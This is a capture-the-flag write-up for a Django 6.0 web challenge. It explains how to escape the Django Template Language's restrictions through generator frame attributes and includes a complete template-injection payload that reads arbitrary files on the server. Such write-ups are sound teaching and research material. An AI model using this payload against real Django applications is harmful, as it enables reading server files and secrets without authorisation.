# Welcome to the Django

* Category: Web, Misc
* Score: 491/500
* Solves: 4/82

## Description

Welcome to the Django, we got fun and flags!

## Overview

This Django application contains a straightforward SSTI vulnerability:
```python
def index(request):
    engine = engines["django"]
    name = html.escape(request.GET.get("name", "World"))
    if len(name) > 210:
        name = "Your name is too long!"
    template = engine.from_string(
        f"""
<!-- omitted -->
<pre>Hello, {name}!</pre>
<!-- omitted -->"""
    )
    return HttpResponse(template.render({}, request))
```

However, the template engine settings are all default, and it's using the `django.DjangoTemplates` backend instead of `jinja2.Jinja2`:
```python
TEMPLATES = [
    {
        "BACKEND": "django.template.backends.django.DjangoTemplates",
        "DIRS": [],
        "APP_DIRS": True,
        "OPTIONS": {
            "context_processors": [
                "django.template.context_processors.request",
                "django.contrib.auth.context_processors.auth",
                "django.contrib.messages.context_processors.messages",
            ],
        },
    },
]
```

At the time of writing, no public exploit exists for Django SSTI that can achieve RCE or arbitrary file read with the default settings (as far as I know).

So the challenge is to figure out how to exploit the SSTI vulnerability in Django 6.0 to read the flag file located at `/flag_<random_string>/flag`.

## Solution

### Django Template Language

Before starting the exploitation, we need to understand some restrictions of Django Template Language (DTL).

> You can check the [official documentation](https://docs.djangoproject.com/en/6.0/topics/templates/) for more details about DTL.

Unlike Jinja2, Django Template Language (DTL) only allows you to access attributes and methods that do not start with an underscore (`_`):
```python
                if VARIABLE_ATTRIBUTE_SEPARATOR + "_" in var or var[0] == "_":
                    raise TemplateSyntaxError(
                        "Variables and attributes may "
                        "not begin with underscores: '%s'" % var
                    )
```
> https://github.com/django/django/blob/e49e14fd9032feb7a8cf254658ac4e74a4ffb712/django/template/base.py#L910-L914

This means the common juicy attributes like `__globals__`, `__builtins__`, or `__subclasses__` are not directly accessible.

Additionally, calling functions or methods in DTL is also restricted.

In Jinja2, if you can somehow access `os.system`, you can easily achieve RCE by doing something like this:
```
{{ obj.os.system("hax") }}
```

However, in DTL, you can't call methods or functions with arguments. To call a method or function, you can only do:
```
{{ obj.foo.bar }}
```
If DTL engine detects that `obj.foo` is callable, it will call it without any arguments. Additionally, if `obj.foo().bar` is also callable, it will call that too, and so on.

This means the expression above is logically equivalent to:
```python
if callable(obj.foo):
    result = obj.foo()
else:
    result = obj.foo
if callable(result.bar):
    result = result.bar()
else:
    result = result.bar
```

Now we have a basic understanding of DTL and its restrictions.

How can we exploit this SSTI then?

### Getting Dangerous Attributes

Though DTL restricts accessing attributes that start with an underscore, this doesn't mean we can't access any dangerous attributes or methods.

For example, `gi_frame`, `ag_frame`, and `cr_frame` are attributes that do not start with an underscore, but they lead to frame objects that have access to the `f_globals` and `f_builtins` attributes, which also don't start with an underscore.

This means if we can somehow create a generator or coroutine object, we can access the frame object and then get the globals or builtins.

To create such objects, we can abuse the variables injected by the context processors. For example, the `request` variable injected by `django.template.context_processors.request` is a good target.

The `request` object has a `GET` property which will return a `QueryDict` object:
```python
    @cached_property
    def GET(self):
        # The WSGI spec says 'QUERY_STRING' may be absent.
        raw_query_string = get_bytes_from_wsgi(self.environ, "QUERY_STRING", "")
        return QueryDict(raw_query_string, encoding=self._encoding)
```
> https://github.com/django/django/blob/afaa527c437f95ab6f8860840d83480d4d15b099/django/core/handlers/wsgi.py#L85-L89

The `QueryDict` class inherits from `MultiValueDict`, which has an `items` method that can be called without arguments and returns a generator object:
```python
    def items(self):
        """
        Yield (key, value) pairs, where value is the last item in the list
        associated with the key.
        """
        for key in self:
            yield key, self[key]
```
> https://github.com/django/django/blob/afaa527c437f95ab6f8860840d83480d4d15b099/django/utils/datastructures.py#L179C1-L185C33

As a result, by using the expression `{{request.GET.items.gi_frame}}`, we can get a frame object. Then we can use `{{request.GET.items.gi_frame.f_builtins.globals.inspect.sys.modules}}` to access all loaded modules!

### Getting the Flag

Now that we can access all loaded modules, we still need to find a way to list the directory and read the flag file.

Fortunately, Python provides a very convenient built-in module for filesystem operations: [pathlib](https://docs.python.org/3.14/library/pathlib.html#module-pathlib).

By calling `pathlib.Path().cwd()`, we can get a `Path` object that represents the current working directory with absolute path.

We can then use the `parent` attribute to go up one level, which gives us the root directory `/` in the container.

Next, we can use `iterdir()` with the `{% for %}` tag to list all files and directories in `/` and find the flag directory that starts with `flag_`.

Finally, we can use the `read_text()` method to read the flag file.

Combining all these together, the final payload looks like this (without minification):
```
{%for p in request.GET.items.gi_frame.f_builtins.globals.inspect.sys.modules.pathlib.Path.cwd.parent.iterdir%}
    {%if request.GET.f in p.name%}
        {%for x in p.iterdir%}
            {{x.read_text}}
        {%endfor%}
    {%endif%}
{%endfor%}
```

After sending the request with `?f=f`, we can retrieve the flag from the response!

The full exploit code is available [here](<./exploit/solve.sh>).